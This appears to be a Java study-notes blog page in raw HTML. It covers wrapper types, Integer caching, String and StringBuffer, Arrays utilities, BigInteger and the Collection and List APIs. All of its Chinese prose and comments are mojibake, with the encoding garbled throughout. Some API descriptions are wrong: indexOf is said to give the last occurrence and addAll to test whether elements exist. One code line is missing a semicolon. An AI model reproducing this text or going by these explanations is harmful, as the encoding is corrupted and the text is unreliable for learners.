class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i=<span class="hljs-number">10</span>;<br> String s1=i.toString();<br> String s2=String.valueOf(i);<br> String s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.out.println(s1);<br> System.out.println(s2);<br> System.out.println(s3);<br></code></pre></td></tr></table></figure><p>bï¼‰String ç±»å‹è½¬åŒ…è£…ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(s1);<br>   Integer i2=Integer.valueOf(s2);<br>   Integer i3=Integer.parseInt(s3);<br>   System.out.println(i1);<br>   System.out.println(i2);<br>   System.out.println(i3);<br></code></pre></td></tr></table></figure><p>cï¼‰ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj1=<span class="hljs-literal">true</span>?<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<span class="hljs-comment">//ä¸‰å…ƒæ¡ä»¶è¿ç®—ç¬¦æ˜¯ä¸€ä¸ªæ•´ä½“</span><br>   System.out.println(obj1);<span class="hljs-comment">//1.0</span><br><br>Object obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>)&#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   System.out.println(obj2);<span class="hljs-comment">//1</span><br><br><br>Integer i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   Integer j=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   System.out.println(i==j);  <span class="hljs-comment">//false</span><br>   <br>   Integer m=<span class="hljs-number">1</span>;<br>   Integer n=<span class="hljs-number">1</span>;<br>   System.out.println(m==n);<span class="hljs-comment">//True,æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡</span><br>   <br>   Integer x=<span class="hljs-number">128</span>;<br>   Integer y=<span class="hljs-number">128</span>;<br>   System.out.println(x==y);<span class="hljs-comment">//Falseè¶…è¿‡èŒƒå›´ï¼Œé€šè¿‡newå»åˆ›å»ºï¼Œä¸ç­‰</span><br>   <br>   Integer a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   System.out.println(a==b);<span class="hljs-comment">//True,å­˜åœ¨åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ¯”è¾ƒçš„æ˜¯å€¼</span><br><br></code></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h1><h2 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h2><ul><li>final ç±»ï¼Œä¸èƒ½è¢«ç»§æ‰¿</li><li>ç›´æ¥èµ‹å€¼ï¼Œè°ƒç”¨æ„é€ å™¨</li><li>å±æ€§ private final char value[ ];å­˜æ”¾å­—ç¬¦ä¸²å†…å®¹</li></ul><h2 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//æŒ‡å‘å¸¸é‡æ± </span><br>String b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//æŒ‡å‘å¯¹è±¡ï¼Œå¯¹è±¡æŒ‡å‘å¸¸é‡æ± </span><br>System.out.println(a.equals(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="å¸¸é‡æ± å­—ç¬¦ä¸²"><a href="#å¸¸é‡æ± å­—ç¬¦ä¸²" class="headerlink" title="å¸¸é‡æ± å­—ç¬¦ä¸²"></a>å¸¸é‡æ± å­—ç¬¦ä¸²</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;hell&quot;</span>;<br>String b=<span class="hljs-string">&quot;jab&quot;</span>;<br>String c=a+b;<span class="hljs-comment">//new äº†ä¸€ä¸ªå¯¹è±¡</span><br>String d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.out.println(c==d);<br><span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     change(str,ch);<br>     System.out.println(str);<br>     System.out.println(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(String str,<span class="hljs-type">char</span> ch[])</span>&#123;<br>     str=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²ç¼–ç "><a href="#å­—ç¬¦ä¸²ç¼–ç " class="headerlink" title="å­—ç¬¦ä¸²ç¼–ç "></a>å­—ç¬¦ä¸²ç¼–ç </h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">String name=<span class="hljs-string">&quot;æˆ‘è™½ç„¶&quot;</span>;<br>String ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.out.println(ISO_s);<br>String UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.out.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="ç‰¹æ€§-1"><a href="#ç‰¹æ€§-1" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h2><ul><li>ä¸èƒ½è¢«ç»§æ‰¿</li><li>çˆ¶ç±»æ˜¯ AbstractStringBuilder</li><li>AbstractStringBuilder æœ‰å±æ€§ char[] value,å­˜æ”¾åœ¨å †ä¸­</li></ul><h2 id="StingBuffer-å’Œ-String-çš„è½¬æ¢"><a href="#StingBuffer-å’Œ-String-çš„è½¬æ¢" class="headerlink" title="StingBuffer å’Œ String çš„è½¬æ¢"></a>StingBuffer å’Œ String çš„è½¬æ¢</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuffer stringBuffer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br>stringBuffer=stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s=stringBuffer.toString();<br>String ss=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stringBuffer);<br>System.out.println(s);<br><span class="hljs-comment">//abcdac</span><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>appendï¼ŒtoString</p><h2 id="Stringã€StringBufferã€StringBuider"><a href="#Stringã€StringBufferã€StringBuider" class="headerlink" title="Stringã€StringBufferã€StringBuider"></a>Stringã€StringBufferã€StringBuider</h2><p>StringBuider æ•ˆç‡æœ€é«˜ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Person abc=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;umr&quot;</span>,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;acd&quot;</span>,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        System.out.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>        String name=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name=name;<br>            <span class="hljs-built_in">this</span>.age=age;<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//[Person&#123;name=&#x27;umr&#x27;, age=23&#125;, Person&#123;name=&#x27;abc&#x27;, age=30&#125;, Person&#123;name=&#x27;acd&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h2><p>Arrays.toString  è¿”å›æ•°ç»„çš„å­—ç¬¦ä¸²å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] aa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>               <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (Integer) o1 - (Integer) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   System.out.println(Arrays.toString(aa));<br>   <span class="hljs-comment">//[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p>Arrays.sort è‡ªç„¶æ’åºå’Œå®šåˆ¶æ’åºï¼ˆæ•°å€¼æ’åºã€å¯¹è±¡æ’åºï¼‰</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">å‚è€ƒå‰é¢çš„ <span class="hljs-built_in">sort</span> æ–¹æ³•ä¾‹å­<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  æ•°ç»„å…ƒç´ çš„å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-type">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   bb[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   System.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist æ•°ç»„è½¬åŒ–ä¸º List é›†åˆ</p><p>Arrays.fill  æ•°ç»„å¡«å……</p><p>Arrays.binarySearch äºŒåˆ†æŸ¥æ‰¾ï¼ˆæœ‰åºæ•°ç»„ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.println(i);<br><span class="hljs-comment">// 10</span><br>å‰æï¼šæœ‰åºæƒ…å†µä¸‹<br><br>æ— åºæ—¶ï¼Œå…ˆæ’åº<br><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.sort(aa);<br>    System.out.println(Arrays.toString(aa));<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.println(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>æ‰¾ä¸åˆ°å°±è¿”å›è´Ÿæ•°ï¼Œ-(low+<span class="hljs-number">1</span>)ï¼Œlow ä¸ºåŸæœ¬å‡ºç°çš„ä½ç½®ï¼Œæ¯”å¦‚æŸ¥æ‰¾ <span class="hljs-number">10</span>ï¼Œè¿”å› -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   å¤åˆ¶æ•°ç»„</p><p>System. currentTimeMillens( )è¿”å›å½“å‰è·ç¦»æ—¶é—´</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>ä¿å­˜æ¯”è¾ƒå¤§çš„æ•°</p><p>BigDecimal  ä¿å­˜ç²¾åº¦æ›´é«˜çš„å°æ•°</p><ul><li>add  åŠ </li><li>subtract å‡</li><li>multiply ä¹˜</li><li>divide é™¤</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">BigInteger bigInteger1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>);<br>BigInteger bigInteger2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;100&quot;</span>);<br><br>BigInteger add=bigInteger1.add(bigInteger2);<br>System.out.println(add);<br><br>BigInteger subtract=bigInteger1.subtract(bigInteger2);<br>System.out.println(subtract);<br><br>BigInteger multiply=bigInteger1.multiply(bigInteger2);<br>System.out.println(multiply);<br><br>BigInteger divide=bigInteger1.divide(bigInteger2);<br>System.out.println(divide);<br></code></pre></td></tr></table></figure><h1 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h1><h2 id="é›†åˆæ¡†æ¶ä½“ç³»"><a href="#é›†åˆæ¡†æ¶ä½“ç³»" class="headerlink" title="é›†åˆæ¡†æ¶ä½“ç³»"></a>é›†åˆæ¡†æ¶ä½“ç³»</h2><ul><li>ä¸»è¦æ˜¯ä¸¤ç»„ Collection å’Œ Map ï¼ˆå•åˆ—é›†åˆï¼ŒåŒåˆ—é›†åˆï¼‰</li><li>Collection æ¥å£æœ‰ä¸¤ä¸ªå­æ¥å£ Listã€Setï¼Œå…¶å®ç°å­ç±»éƒ½æ˜¯å•åˆ—é›†åˆ</li><li>Map æ¥å£çš„å®ç°å­ç±»æ˜¯åŒåˆ—é›†åˆï¼Œå­˜æ”¾çš„ K-V</li></ul><h2 id="Collection-æ¥å£"><a href="#Collection-æ¥å£" class="headerlink" title="Collection æ¥å£"></a>Collection æ¥å£</h2><ul><li><p>add æ·»åŠ å•ä¸ªå…ƒç´ ï¼Œéƒ½æ˜¯Object ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹åŠ å…¥çš„æ˜¯åŒ…è£…ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection collection=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>  collection.add(<span class="hljs-number">100</span>);<br>  collection.add(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.add(<span class="hljs-literal">false</span>);<br>  collection.add(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove åˆ é™¤æŒ‡å®šå…ƒç´ ï¼ŒList çš„å­ç±»æœ‰é‡è½½ï¼Œå¯ä»¥æŒ‰ index åˆ é™¤</p></li><li><p>contains æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">collection.contains(<span class="hljs-literal">false</span>);<br>   System.out.println(collection.contains(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size è·å–å…ƒç´ ä¸ªæ•°</p></li><li><p>isEmpty åˆ¤æ–­æ˜¯å¦ä¸ºç©º</p></li><li><p>clear æ¸…ç©º</p></li><li><p>addAll æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨</p></li><li><p>removeAll åˆ é™¤å¤šä¸ªå…ƒç´ </p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>æœ‰åºï¼Œå¯é‡å¤</li><li>void add ( int index,Object ele ) åœ¨ index ä½ç½®æ’å…¥ ele å…ƒç´ </li><li>boolean addAll ( int index,Collection eles) ä» index ä½ç½®å¼€å§‹å°† eles ä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥</li><li>Object get ( int index) è·å–æŒ‡å®š index ä½ç½®çš„å…ƒç´ </li><li>int indexOfï¼ˆObject obj)è¿”å› obj åœ¨å½“å‰é›†åˆä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®</li><li>Object remove ( int index) ç§»é™¤æŒ‡å®š index ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´ </li><li>Object set ï¼ˆ int index,Object ele )  è®¾ç½®æŒ‡å®š index ä½ç½®çš„å…ƒç´ ä¸º eleï¼Œç›¸å½“äºæ›¿æ¢</li><li>List sublist ( int fromIndex,int toIndex)  è¿”å›ä» fromIndex åˆ° toIndex ä½ç½®çš„å­é›†åˆ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list.add(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list2.add(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.out.println(list.get(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.out.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.remove(<span class="hljs-number">8</span>);<br>   list.set(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.out.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-éå†"><a href="#List-éå†" class="headerlink" title="List éå†"></a>List éå†</h2><ul><li>é€‚ç”¨äºæ‰€æœ‰å®ç°å­ç±»</li></ul><p>è¿­ä»£å™¨éå†</p><ul><li><p>Iterator å¯¹è±¡ä¸ºè¿­ä»£å™¨ï¼Œç”¨äºéå† Collection é›†åˆçš„å…ƒç´ </p></li><li><p>å®ç° Collection æ¥å£çš„é›†åˆç±»éƒ½æœ‰ iterator( ) æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªè¿­ä»£å™¨</p></li><li><p>Iterator ç»“æ„</p></li><li><p>Iterator ä»…ç”¨äºéå†é›†åˆï¼ŒIterator æœ¬èº«å¹¶ä¸å­˜æ”¾å¯¹è±¡</p></li><li><p>å¿«æ·è¾“å…¥ itit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=list.iterator();<br>    Object next=iterator.next();<br>    System.out.println(next);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.next();<br>    System.out.println(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//ç›¸å½“äºæŒ‡é’ˆ</span><br></code></pre></td></tr></table></figure></li></ul><p>å¢å¼º for å¾ªç¯</p><ul><li>å®é™…ä¸Šè¿˜æ˜¯è¿­ä»£å™¨éå†</li><li>å¿«æ·è¾“å…¥ iter&#x2F;xxx.for</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) 